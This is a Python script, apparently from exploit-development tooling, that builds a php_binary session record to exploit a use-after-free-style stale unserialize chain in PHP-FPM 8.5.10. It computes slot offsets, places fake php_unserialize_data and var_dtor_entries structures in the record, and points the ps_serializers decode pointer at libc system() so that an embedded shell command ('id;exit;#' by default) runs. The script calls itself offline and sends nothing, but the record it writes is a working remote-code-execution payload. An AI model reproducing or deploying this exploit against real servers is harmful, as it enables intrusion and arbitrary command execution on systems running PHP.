#!/usr/bin/env python3
"""g2_chain.py - G2 FPM chain profile and offline php_binary record plan.

G2 is the confirmed FPM route on the plain PHP 8.5.10 build: a controlled
bailout leaves a stale BG(unserialize) dtor chain, the pre RINIT upload progress
session decode reuses it, and the typed zval write reaches ps_serializers[2]
decode in .data. The forced END decode then calls the overwritten pointer with
the session record bytes as rdi.

This module is profile data plus arithmetic: it loads
addresses/g2_fpm_8510.json, computes

    used_slots = (target - (b0 + 0x10)) / 16

and frames the php_binary record of receipts/fpmgadget (rec1 long zval, rec2
payload with the fake php_unserialize_data and the fake var_dtor_entries).
No transport and no process control: the driver step is --step g2 and only
writes the record bytes plus the plan JSON.
"""


import argparse
import json
import struct
from pathlib import Path


HERE = Path(__file__).resolve()
DEFAULT_PROFILE = HERE.parents[2] / "addresses" / "g2_fpm_8510.json"
COMMAND_BYTES = 32
FAKE_P_BYTES = 72
FAKE_B0_BYTES = 16


def hex_int(value, name: str) -> int:
    """Parse an int or a 0x string, reject bool and everything else."""
    if isinstance(value, bool):
        raise ValueError(f"{name} must be an integer, not a bool")
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        try:
            return int(value, 16) if value.lower().startswith("0x") else int(value)
        except ValueError as error:
            raise ValueError(f"{name} is not an integer: {value!r}") from error
    raise ValueError(f"{name} is not an integer: {value!r}")


def load_profile(path: Path | None = None) -> tuple[dict, Path]:
    profile_path = Path(path) if path is not None else DEFAULT_PROFILE
    return json.loads(profile_path.read_text()), profile_path


def system_target(profile: dict, libc_base: int) -> int:
    return libc_base + hex_int(profile["libc"]["system_offset"], "system offset")


def used_slots_for(target: int, b0: int) -> int:
    """Slot index for the 16 byte write; target and b0+0x10 must agree mod 16."""
    delta = target - (b0 + 0x10)
    if delta % 16:
        raise ValueError(
            f"target 0x{target:x} is not reachable from b0 0x{b0:x}: "
            f"target - (b0 + 0x10) = 0x{delta:x} is not 16 byte aligned"
        )
    used_slots = delta // 16
    if not -(1 << 63) <= used_slots < 0:
        raise ValueError(
            f"used_slots {used_slots} is outside the signed negative range; "
            "the write direction is downward from b0"
        )
    return used_slots


def _solve_lengths(total: int, rec1_len: int) -> tuple[int, int, int]:
    """Solve total = rec1 + 8 + digits(L) + L; returns L, prefix len, payload start."""
    if total <= rec1_len + 10:
        raise ValueError(
            f"total {total} is too small for a {rec1_len} byte rec1"
        )
    length = total - rec1_len - 8
    for _ in range(8):
        next_length = total - rec1_len - 8 - len(str(length))
        if next_length == length:
            break
        length = next_length
    else:
        raise ValueError("record length does not converge")
    if length <= 0:
        raise ValueError(f"negative payload length {length}")
    prefix_len = 6 + len(str(length))  # 0x01 'z' s : digits : "
    return length, prefix_len, rec1_len + prefix_len


def _command_bytes(command: str | bytes) -> bytes:
    if isinstance(command, str):
        command = command.encode("latin1")
    if not isinstance(command, bytes):
        raise ValueError("command must be a str or bytes")
    if not command:
        raise ValueError("command is empty")
    if len(command) > COMMAND_BYTES:
        raise ValueError(
            f"command is {len(command)} bytes; the php_binary key length byte "
            f"is fixed at 0x20, so the maximum is {COMMAND_BYTES}"
        )
    if not command.rstrip().endswith(b"#"):
        raise ValueError(
            "command must end in #: the serialized i:<n>; text follows the "
            "command in the same shell line and is commented out"
        )
    return command + b" " * (COMMAND_BYTES - len(command))


def _long_value(value: str | bytes) -> bytes:
    if isinstance(value, str):
        value = value.encode("latin1")
    if not isinstance(value, bytes):
        raise ValueError("value must be a str or bytes")
    if not value.startswith(b"i:") or not value.endswith(b";"):
        raise ValueError("value must be a serialized long: i:<n>;")
    digits = value[2:-1]
    if digits[:1] == b"-":
        digits = digits[1:]
    if not digits.isdigit():
        raise ValueError("value must be a serialized long: i:<n>;")
    return value


def plan(x: int, p: int, b0: int, total: int | None = None,
         command: str | bytes = "id;exit;#", value: str | bytes | None = None,
         libc_base: int | None = None, target: int | None = None,
         profile: dict | None = None) -> dict:
    """Offline G2 record plan from operator supplied addresses.

    All addresses are explicit. The module never guesses X, P, B0 or a libc
    base; a missing or inconsistent address raises ValueError.
    """
    if profile is None:
        profile, _path = load_profile()
    table = profile["ps_serializers"]
    if target is None:
        target = hex_int(table["default_target"], "default target")
    for name, address in (("x", x), ("p", p), ("b0", b0), ("target", target)):
        if not 0 < address < 1 << 64:
            raise ValueError(f"{name} must be a positive 64 bit address")
    if not x + 24 <= p:
        raise ValueError(
            f"P 0x{p:x} is not inside the record buffer at X 0x{x:x} "
            f"(ZSTR_VAL = X + 24)"
        )
    if not p + 0x48 <= b0:
        raise ValueError(
            f"B0 0x{b0:x} overlaps the fake php_unserialize_data at P 0x{p:x}"
        )
    if target % 16:
        raise ValueError(f"target 0x{target:x} is not 16 byte aligned")
    entry = None
    for candidate in table["entries"]:
        decode = hex_int(candidate["decode"], "decode slot")
        if decode == target:
            entry = candidate
            if not candidate.get("decode_16b_aligned"):
                raise ValueError(
                    f"ps_serializers[{candidate['index']}] ({candidate['name']}) "
                    "decode is not 16 byte aligned"
                )
    if entry is not None and target != hex_int(table["table"], "table") \
            + entry["index"] * profile["structs"]["ps_serializer_size"] + 0x10:
        raise ValueError("ps_serializers entry arithmetic disagrees with the table")

    used_slots = used_slots_for(target, b0)
    second_slot = target + 16
    if second_slot >= b0:
        raise ValueError("second slot is not below b0; the write is not downward")

    if libc_base is not None and value is not None:
        raise ValueError("pass --libc-base or --g2-value, not both")
    if libc_base is not None:
        system = system_target(profile, libc_base)
        value_bytes = f"i:{system};".encode("ascii")
    else:
        system = None
        value_bytes = _long_value(value if value is not None else "i:1;")

    command_bytes = _command_bytes(command)
    rec1 = b"\x20" + command_bytes + value_bytes
    if total is None:
        total = profile["record"]["lab_geometry"]["total"]

    length, prefix_len, payload_start = _solve_lengths(total, len(rec1))
    p_off = p - (x + 24)
    b_off = b0 - (x + 24)
    p_idx = p_off - payload_start
    b_idx = b_off - payload_start
    checks = [
        {"check": "rec1_key_length", "ok": len(command_bytes) == COMMAND_BYTES,
         "detail": f"{len(command_bytes)} byte key, leading byte 0x20"},
        {"check": "long_value", "ok": True, "detail": value_bytes.decode("latin1")},
        {"check": "target_16b_aligned", "ok": target % 16 == 0,
         "detail": f"0x{target:x}"},
        {"check": "used_slots_negative", "ok": used_slots < 0,
         "detail": f"{used_slots}"},
        {"check": "second_slot", "ok": second_slot < b0,
         "detail": f"0x{second_slot:x}"},
        {"check": "fake_p_in_payload",
         "ok": p_idx >= 0 and p_idx + FAKE_P_BYTES <= length,
         "detail": f"p_off 0x{p_off:x} p_idx {p_idx} L {length}"},
        {"check": "fake_b0_in_payload",
         "ok": b_idx >= 0 and b_idx + FAKE_B0_BYTES <= length,
         "detail": f"b_off 0x{b_off:x} b_idx {b_idx} L {length}"},
        {"check": "record_length", "ok": length > 0,
         "detail": f"total {total} rec1 {len(rec1)} L {length}"},
    ]
    failed = [item["check"] for item in checks if not item["ok"]]
    if failed:
        raise ValueError("record checks failed: " + ", ".join(failed))

    payload = bytearray(length)
    struct.pack_into(
        "<QQQQQQQQ", payload, p_idx,
        p + 56, b0, b0, 0, 0, 0, 0x7FFFFFFF,
        profile["structs"]["var_entries_max"],
    )
    struct.pack_into("<qQ", payload, b_idx, used_slots, 0)
    record = (
        rec1
        + b"\x01zs:" + str(length).encode("ascii") + b':"'
        + bytes(payload)
        + b'";'
    )
    if len(record) != total:
        raise ValueError(f"record is {len(record)} bytes, expected {total}")
    if record[payload_start + p_idx:payload_start + p_idx + 8] != \
            struct.pack("<Q", p + 56):
        raise ValueError("fake P placement mismatch")
    if record[payload_start + b_idx:payload_start + b_idx + 8] != \
            struct.pack("<q", used_slots):
        raise ValueError("fake B0 placement mismatch")

    return {
        "profile": profile["name"],
        "lane": profile["lane"],
        "stage": profile["stage"],
        "status": profile["status"],
        "binary": profile["binary"],
        "build_id": profile["build_id"],
        "php_version": profile["php_version"],
        "elf_type": profile["elf_type"],
        "pie": profile["pie"],
        "dry_run": True,
        "sent": False,
        "no_transport": True,
        "addresses": {
            "x": f"0x{x:x}",
            "zstr_val": f"0x{x + 24:x}",
            "p": f"0x{p:x}",
            "b0": f"0x{b0:x}",
            "target": f"0x{target:x}",
            "system": f"0x{system:x}" if system is not None else None,
            "libc_base": f"0x{libc_base:x}" if libc_base is not None else None,
        },
        "target_entry": (
            {"index": entry["index"], "name": entry["name"]}
            if entry is not None else None
        ),
        "ps_serializers": {
            "table": table["table"],
            "active_serializer_slot": table["active_serializer_slot"],
            "terminator": table["terminator"],
        },
        "decode_call": profile["decode_call"],
        "used_slots": used_slots,
        "slot": f"0x{target:x}",
        "second_slot": f"0x{second_slot:x}",
        "type_zero_offsets": [
            f"0x{target + 8:x}", f"0x{target + 24:x}"],
        "geometry": {
            "total": total,
            "rec1_len": len(rec1),
            "command_bytes": len(command_bytes),
            "value": value_bytes.decode("latin1"),
            "length": length,
            "payload_start": payload_start,
            "p_off": p_off,
            "p_idx": p_idx,
            "b_off": b_off,
            "b_idx": b_idx,
        },
        "checks": checks,
        "prerequisites": profile["prerequisites"],
        "caveats": profile["caveats"],
        "receipts": profile["receipts"],
        "record": record,
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="G2 FPM record plan (offline, no transport)")
    parser.add_argument("--g2-x", required=True, help="record buffer zend_string X")
    parser.add_argument("--g2-p", required=True, help="stale php_unserialize_data P")
    parser.add_argument("--g2-b0", required=True, help="stale var_dtor_entries B0")
    parser.add_argument("--g2-total", type=int, default=None)
    parser.add_argument("--g2-target", default=None)
    parser.add_argument("--g2-value", default=None)
    parser.add_argument("--libc-base", default=None)
    parser.add_argument("--command", default="id;exit;#")
    parser.add_argument("--output", type=Path, default=None)
    args = parser.parse_args()
    try:
        summary = plan(
            x=hex_int(args.g2_x, "--g2-x"),
            p=hex_int(args.g2_p, "--g2-p"),
            b0=hex_int(args.g2_b0, "--g2-b0"),
            total=args.g2_total,
            command=args.command,
            value=args.g2_value,
            libc_base=(hex_int(args.libc_base, "--libc-base")
                       if args.libc_base is not None else None),
            target=(hex_int(args.g2_target, "--g2-target")
                    if args.g2_target is not None else None),
        )
    except (OSError, TypeError, ValueError) as error:
        print(json.dumps({"step": "g2", "error": f"{type(error).__name__}: {error}"}))
        return 2
    record = summary.pop("record")
    if args.output is not None:
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / "g2-record.bin").write_bytes(record)
        (args.output / "result.json").write_text(
            json.dumps(summary, indent=2, sort_keys=True) + "\n")
    print(json.dumps(summary, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
